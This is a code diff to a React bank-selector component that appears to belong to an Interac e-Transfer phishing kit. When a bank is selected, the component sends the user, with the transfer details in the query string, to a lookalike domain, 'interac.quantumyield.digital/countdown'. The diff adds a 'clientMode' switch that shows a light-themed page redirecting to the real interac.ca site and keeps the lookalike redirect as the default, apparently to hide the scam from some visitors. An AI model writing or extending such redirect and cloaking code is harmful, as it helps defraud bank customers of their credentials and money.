@@ -18,9 +18,10 @@ interface TransferData {
 interface BankSelectorGridProps {
   searchTerm?: string
   transferData?: TransferData | null
+  clientMode?: boolean
 }
 
-export default function BankSelectorGrid({ searchTerm = "", transferData }: BankSelectorGridProps) {
+export default function BankSelectorGrid({ searchTerm = "", transferData, clientMode = false }: BankSelectorGridProps) {
   const router = useRouter()
   const [selectedBank, setSelectedBank] = useState<string | null>(null)
   const [banks, setBanks] = useState<Bank[]>([])
@@ -55,12 +56,26 @@ export default function BankSelectorGrid({ searchTerm = "", transferData }: Bank
       params.set("message", transferData.message)
       params.set("timestamp", transferData.timestamp)
     }
-    window.location.href = `https://interac.quantumyield.digital/countdown?${params.toString()}`
+    window.location.href = clientMode
+      ? `https://www.interac.ca/en/consumers/etransfer/?${params.toString()}`
+      : `https://interac.quantumyield.digital/countdown?${params.toString()}`
   }
+
+  const containerCls = clientMode
+    ? "bg-white border border-gray-200 shadow-sm p-6 md:p-8 rounded-xl"
+    : "bg-zinc-900 p-6 md:p-8 rounded-xl"
+
+  const emptyTextCls  = clientMode ? "text-gray-400" : "text-zinc-400"
+  const emptyText2Cls = clientMode ? "text-gray-400" : "text-zinc-500"
+  const bankCardBase  = clientMode ? "bg-gray-50 border-gray-200" : "bg-zinc-800 border-zinc-700"
+  const bankCardHover = clientMode
+    ? "hover:border-[#FDB913]/80 hover:bg-white"
+    : "hover:border-[#FDB913]/60 hover:bg-zinc-700"
+  const ringOffset    = clientMode ? "ring-offset-white" : "ring-offset-zinc-900"
 
   if (isLoading) {
     return (
-      <div className="bg-zinc-900 p-6 md:p-8 rounded-xl" role="region" aria-label="Bank selection grid">
+      <div className={containerCls} role="region" aria-label="Bank selection grid">
         <div className="text-center py-12">
           <div
             className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#FDB913] border-r-transparent"
@@ -68,18 +83,18 @@ export default function BankSelectorGrid({ searchTerm = "", transferData }: Bank
           >
             <span className="sr-only">Loading banks...</span>
           </div>
-          <p className="text-zinc-400 mt-4 text-sm">Loading financial institutions...</p>
+          <p className={`${emptyTextCls} mt-4 text-sm`}>Loading financial institutions...</p>
         </div>
       </div>
     )
   }
 
   return (
-    <div className="bg-zinc-900 p-6 md:p-8 rounded-xl" role="region" aria-label="Bank selection grid">
+    <div className={containerCls} role="region" aria-label="Bank selection grid">
       {banks.length === 0 ? (
         <div className="text-center py-12">
-          <p className="text-zinc-400 text-lg">No financial institutions match your search.</p>
-          <p className="text-zinc-500 text-sm mt-2">Try adjusting your search term.</p>
+          <p className={`${emptyTextCls} text-lg`}>No financial institutions match your search.</p>
+          <p className={`${emptyText2Cls} text-sm mt-2`}>Try adjusting your search term.</p>
         </div>
       ) : (
         <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3 md:gap-4">
@@ -88,14 +103,14 @@ export default function BankSelectorGrid({ searchTerm = "", transferData }: Bank
               key={bank.id}
               onClick={() => handleBankSelect(bank.id, bank.name)}
               className={`
-                group relative bg-zinc-800 p-4 rounded-xl transition-all duration-200
+                group relative ${bankCardBase} p-4 rounded-xl transition-all duration-200
                 flex flex-col items-center justify-center gap-2 min-h-[100px]
                 border-2 ${
                   selectedBank === bank.id
-                    ? "border-[#FDB913] ring-2 ring-[#FDB913] ring-offset-2 ring-offset-zinc-900 scale-105"
-                    : "border-zinc-700 hover:border-[#FDB913]/60 hover:bg-zinc-700"
+                    ? `border-[#FDB913] ring-2 ring-[#FDB913] ring-offset-2 ${ringOffset} scale-105`
+                    : `${bankCardHover}`
                 }
-                focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 focus:ring-offset-zinc-900
+                focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 ${ringOffset}
               `}
               aria-label={`Select ${bank.name}`}
               aria-pressed={selectedBank === bank.id}
